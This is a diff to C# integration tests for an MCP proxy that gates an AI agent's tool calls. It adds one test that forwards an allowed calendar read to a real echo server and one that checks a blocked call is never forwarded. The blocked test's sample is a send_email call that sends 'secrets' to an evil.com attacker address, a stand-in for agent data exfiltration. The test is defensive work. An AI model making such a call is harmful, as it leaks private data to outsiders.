@@ -154,17 +154,59 @@ public sealed class IntegrationTests
             Assert.Equal("Block", policyDecision.Decision);
     }
 
+    private static bool NodeAvailable()
+    {
+        try
+        {
+            using var p = System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
+            { FileName = "node", Arguments = "--version", RedirectStandardOutput = true, UseShellExecute = false });
+            return p is not null && p.WaitForExit(5000) && p.ExitCode == 0;
+        }
+        catch { return false; }
+    }
+
     /// <summary>
-    /// ForwardToRealMcpServer throws NotImplementedException — the transport
-    /// stub is present and correctly signals that real MCP transport is out
-    /// of scope for this prototype.
+    /// REAL MCP transport: connect to a real MCP server (mcp-echo-server.js over stdio JSON-RPC),
+    /// list its tools, and forward an APPROVED call (read_calendar — low risk). The proxy gates the
+    /// intent, then the real server responds.
     /// </summary>
     [Fact]
-    public void McpProxy_ForwardToRealMcpServer_is_stubbed()
+    public void McpProxy_forwards_an_allowed_call_to_a_real_mcp_server()
     {
-        var call = new McpToolCall("send_email", new Dictionary<string, string> { ["to"] = "x@y.com" });
-        var ex = Assert.Throws<NotImplementedException>(() => McpProxy.ForwardToRealMcpServer(call).GetAwaiter().GetResult());
-        Assert.Contains("not implemented", ex.Message, StringComparison.OrdinalIgnoreCase);
+        if (!NodeAvailable()) return;   // node runs the real MCP server; required for this test
+        using var client = McpStdioClient.Connect("node", McpStdioClient.EchoServerScript());
+
+        var tools = client.ListTools();
+        Assert.Contains("read_calendar", tools);
+        Assert.Contains("send_email", tools);
+
+        var proxy = Proxy();
+        var fwd = proxy.GateAndForward(
+            new McpToolCall("read_calendar", new Dictionary<string, string> { ["range"] = "Friday" }), client);
+
+        Assert.True(fwd.Gate.Allowed);
+        Assert.NotNull(fwd.ServerResponse);
+        Assert.Contains("read_calendar executed", fwd.ServerResponse!);
+    }
+
+    /// <summary>
+    /// REAL MCP transport: a blocked send_email to an attacker is NEVER forwarded — the gate stops
+    /// it before any bytes reach the server (ServerResponse is null).
+    /// </summary>
+    [Fact]
+    public void McpProxy_does_not_forward_a_blocked_send_email()
+    {
+        if (!NodeAvailable()) return;
+        using var client = McpStdioClient.Connect("node", McpStdioClient.EchoServerScript());
+
+        var ws = Workspace.CreateDemo();
+        var proxy = Proxy(ws: ws);
+        var fwd = proxy.GateAndForward(
+            new McpToolCall("send_email", new Dictionary<string, string> { ["to"] = "attacker@evil.com", ["body"] = "secrets" }), client);
+
+        Assert.False(fwd.Gate.Allowed);
+        Assert.Null(fwd.ServerResponse);    // never forwarded
+        Assert.Empty(ws.SentEmails);
     }
 
     // ═══════════════════════════════════════════════════════════════════════════
